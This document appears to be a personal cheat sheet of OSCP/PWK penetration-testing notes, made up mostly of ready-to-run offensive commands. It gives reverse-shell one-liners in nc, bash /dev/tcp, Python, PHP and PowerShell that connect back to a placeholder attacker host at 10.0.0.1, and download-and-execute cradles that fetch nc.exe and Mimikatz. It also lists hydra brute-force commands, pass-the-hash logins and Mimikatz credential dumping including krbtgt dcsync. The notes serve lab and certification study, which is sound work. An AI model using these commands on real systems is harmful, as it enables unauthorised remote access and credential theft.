# OSCP-PWK-Notes


## Useful services

### SSHd

```bash
sudo systemctl start ssh

sudo systemctl stop ssh
```

Add this line to `/etc/ssh/ssh_config` or `/etc/ssh/sshd_config` if you are dealing with old versions of `ssh`. Running `ssh` with the `-v` option will help debug what key exchange algorithms you need.
```
KexAlgorithms diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

### Apache2

```bash

sudo systemctl start apache2

sudo systemctl stop apache2
```

Default root directory is `/var/www/html`.

## Scanning

```bash
nmap -Pn -sT -sV -sC <target>
nmap -p445 --script smb-vuln-* <target>
nmap -Pn --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <target> # SambaCry
nmap -sU --script tftp-enum -p69,161,53 <target>
```

## File Transfers

### HTTP
```bash
On Linux:
sudo python3 -m http.server 80
sudo python2 -m SimpleHTTPServer 80
sudo updog -p 80

curl http://10.0.0.1:80/nc.exe > nc.exe
wget http://10.0.0.1:80/nc.exe -O nc.exe

On Windows:
certutil -f -split -urlcache http://10.0.0.1:80/nc.exe nc.exe
(New-Object System.Net.WebClient).DownloadFile("http://10.0.0.1:80/nc.exe", "C:\nc.exe")  
Invoke-WebRequest "http://10.0.0.1:80/nc.exe" -OutFile "C:\nc.exe"  
```

### SMB

```bash
On Linux:
sudo smbserver.py -port 445 -smb2support share . #SMB2
sudo smbserver.py -port 445 share . #SMB1

On Windows:
copy \\10.0.0.1\share\nc.exe C:\nc.exe
\\10.0.0.1\share\whoami.exe
```

### FTP

```bash
On Linux:
sudo python3 -m pyftpdlib -p 21 -w

On Windows:
ftp 10.0.0.1
ftp> binary
ftp> passive
```

### TFTP

```bash
On Linux:
sudo atftpd --daemon --port 69 /tftp
```

```bash
On Windows
tftp -i 10.0.0.1 GET nc.exe
```

### nc

Linux &rarr; Windows
```bash
On Linux:
cat nc.exe | nc -lvnp 1337

On Windows
nc 10.0.0.1 1337 > nc.exe
```

Windows &rarr; Linux
```bash
On Linux:
nc 10.0.0.1 1337 < nc.exe

On Windows
nc -lvnp 1337 > nc.exe
```

## Reverse Shell

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Listener
```bash
rlwrap nc -lvnp 1337
```

### Netcat/nc Traditional

```
nc -e /bin/sh 10.0.0.1 1337
nc -e /bin/bash 10.0.0.1 1337
nc -c /bin/bash 10.0.0.1 1337
```

### Netcat/nc OpenBSD

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1337 >/tmp/f
```

### Python

Linux:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect(("10.0.0.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Windows:
```
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 1337)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

### PHP
```
php -r '$sock=fsockopen("10.0.0.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",1337);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("10.0.0.1",1337);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### Bash TCP

```
bash -i >& /dev/tcp/10.0.0.1/1337 0>&1
```

### Powershell

```
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 1337
```

## Powershell version

```powershell
64-bit: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
32-bit: C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe 
```

To check 32-bit/64-bit:
```powershell
[Environment]::Is64BitProcess
```

## Upgrade to Full TTY

Some commands/exploits may only work when you have full TTY.

### Socat

Attacker:
```bash
socat file:`tty`,raw,echo=0 TCP-L:1337
```

Victim:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:1337
```

### From nc

Victim:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-z
```

Attacker:
```bash
echo $TERM     # note down
stty -a        # note down rows and cols
stty raw -echo
fg
```

Victim:
```bash
reset
export SHELL=bash          
export TERM=xterm256-color # from "echo $TERM"
stty rows 38 columns 116   # from "stty -a"
```

## Port Enumeration

### Port 21 (FTP)
```bash
hydra -L usernames.txt -P passwords.txt <target> ftp 
```

### Port 139/445 (SMB)
```bash
enum4linux -a -u "<username>" -p "<password>" <IP>
smbmap -H <IP> [-P <PORT>]                              # Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>]  # Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] # Pass-the-Hash
smbclient --no-pass -L //<IP>                           # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
hydra -L usernames.txt -P passwords.txt <target> smb 
```
```bash
psexec.py -hashes ":<hash>" Administrator@10.0.0.1
psexec.py Administrator:<password>@10.0.0.1
psexec.py <domain>/Administrator:<password>@10.0.0.1
```

If there is no null user, remember to try with the guest username.

If there is SMB version incompatibility, edit `/etc/samba/smb.conf` and append `min protocol = SMB1` to `[global]` seciton.    

### Port 389 (LDAP)
```
ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local" 
python windapsearch.py -d htb.local -U
```

### Port 80 (HTTP)
```bash
gobuster dir -u "http://target:8080/" -w /usr/share/wordlists/dirb/common.txt -t 12 -x .txt,.jsp
nikto -host http://target
hydra -L usernames.txt -P passwords.txt <target> http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=300&User=^USER^&Password=^PASS^:Login Failed"
```

### Port 3306 (MySQL)
```bash
hydra -L usernames.txt -P passwords.txt <target> mysql
```

### Port 5985 (WinRM)
```bash
evil-winrm -i <target> -u <username> -p <password>
evil-winrm -i <target> -u <username> -H <NT hash>
```

```bash 
git clone https://github.com/mchoji/winrm-brute
cd winrm-brute
bundle config path vendor/bundle
bundle install
bundle exec ./winrm-brute.rb -U users.txt -P passwords.txt 10.0.0.1
```

### Port 1433 (MSSQL)

```bash
sqsh -S <target>:1433 -U sa
```

## Privilege Escalation

### [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

#### [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases)

```
winPEAS.exe
```

#### [Seatbelt](https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Seatbelt.exe)

```
Seatbelt.exe
```

#### [Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)

```
Import-Module .\Sherlock.ps1; Find-AllVulns
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Sherlock.ps1'); Find-AllVulns
```

#### [Powerless](https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat)

```
Powerless.bat
```

#### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

```
mimikatz.exe
mimikatz.exe "privilege::debug token::elevate lsadump::sam exit"
mimikatz.exe "privilege::debug token::elevate lsadump::secrets exit"
mimikatz.exe "privilege::debug token::elevate lsadump::cache exit"
mimikatz.exe "privilege::debug token::elevate sekurlsa::logonpasswords exit"
mimikatz.exe "privilege::debug token::elevate vault::cred /patch exit"
mimikatz.exe "privilege::debug token::elevate lsadump::dcsync /user:domain\krbtgt /domain:lab.local exit"
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
```

#### [Kerberoast](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

```
Import-Module .\Invoke-Kerberoast.ps1; Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
```

#### [Windows Exploit Suggester NG](https://github.com/bitsadmin/wesng)

```
wes.py --update
systeminfo > systeminfo.txt
wes.py systeminfo.txt
```


### [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

#### [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh)

```
./lse.sh -l 1 -i
```

#### [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

```
./LinEnum.sh
```

#### [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)

```
./linpeas.sh
```

#### [SUDO_Killer](https://github.com/TH3xACE/SUDO_KILLER)

```
./extract.sh
./sudo_killer.sh -c -i /path/sk_offline.txt
```

#### [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh)

```
./linux-exploit-suggester.sh
```

#### [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl)

```
./linux-exploit-suggester.pl
```

## Compiling Exploits

```bash
gcc -pthread dirty.c -o dirty -lcrypt
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
gcc -m32 -Wl,--hash-style=both 9542.c -o 9542
```

## Static Binaries

https://github.com/ernw/static-toolbox

https://github.com/ZephrFish/static-tools

https://github.com/andrew-d/static-binaries

https://github.com/interference-security/kali-windows-binaries

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

## Compiled Exploits

https://github.com/SecWiki/windows-kernel-exploits

https://github.com/SecWiki/linux-kernel-exploits

https://github.com/abatchy17/WindowsExploits

## Useful Exploits

[Windows XP SP0/SP1 Privilege Escalation to System](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)

[Bypassing default UAC settings manually](https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/)

[MS17-010/Eternal Blue](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py)

[Ghostcat](https://github.com/dacade/CVE-2020-1938)

[SMTP Shellshock](https://gist.github.com/claudijd/33771b6c17bc2e4bc59c)

[SambaCry](https://github.com/joxeankoret/CVE-2017-7494)

[Samba Symlink Traversal](https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually)

## References

https://github.com/tbowman01/OSCP-PWK-Notes-Public

https://github.com/swisskyrepo/PayloadsAllTheThings

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-3-upgrading-from-netcat-with-magic

https://book.hacktricks.xyz/

https://github.com/frizb/Hydra-Cheatsheet